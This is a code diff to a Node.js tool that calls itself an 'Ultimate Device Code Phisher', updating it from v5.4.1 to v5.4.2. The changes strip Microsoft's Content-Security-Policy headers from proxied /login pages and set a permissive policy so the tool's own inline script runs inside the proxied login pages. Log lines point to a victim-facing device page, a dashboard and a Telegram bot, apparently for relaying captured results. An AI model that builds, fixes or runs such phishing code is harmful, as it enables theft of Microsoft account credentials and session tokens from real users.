@@ -1,8 +1,8 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.1 – Order Fix
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.2 – CSP‑Fixed Proxy
 // ============================================================
 // Removed Puppeteer, hardened proxy, safe decompression.
-// Fixed 'app' initialization order.
+// Fixed CSP to allow Microsoft CDN resources and our inline script.
 // ============================================================
 
 const http = require('http');
@@ -441,7 +441,11 @@ app.use((req, res, next) => {
     next();
 });
 
+// 🔥 CSP middleware – skip for proxy routes to avoid blocking Microsoft resources
 app.use((req, res, next) => {
+    if (req.path.startsWith('/login')) {
+        return next(); // let the proxy set its own permissive CSP
+    }
     res.setHeader("Content-Security-Policy", "default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;");
     next();
 });
@@ -775,10 +779,13 @@ app.all('/login*', async (req, res) => {
             }
         }
 
-        // Remove content-encoding header since we decompressed it
-        delete responseHeaders['content-encoding'];
+        // 🔥 Remove any CSP from Microsoft to avoid conflicts, and set our permissive CSP
+        delete responseHeaders['content-security-policy'];
+        delete responseHeaders['content-security-policy-report-only'];
 
         res.set(responseHeaders);
+        // 🔥 Set a permissive CSP that allows all resources and our inline script
+        res.setHeader('Content-Security-Policy', "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data:; connect-src *;");
         res.status(resp.status);
         res.send(data);
 
@@ -1006,7 +1013,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.1 – Order Fix running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.2 – CSP‑Fixed Proxy running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
